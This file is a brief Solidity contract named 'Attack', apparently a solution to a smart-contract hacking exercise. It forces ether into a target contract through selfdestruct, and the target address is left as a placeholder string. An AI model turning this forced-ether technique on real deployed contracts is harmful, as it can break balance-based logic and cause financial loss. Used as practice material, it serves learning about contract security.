// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address payable target_addr = payable("Instance address");

    constructor() payable { // send ethers to the contract when deploying it
        
    }

    function kill() public {
        selfdestruct(target_addr);
    }
}
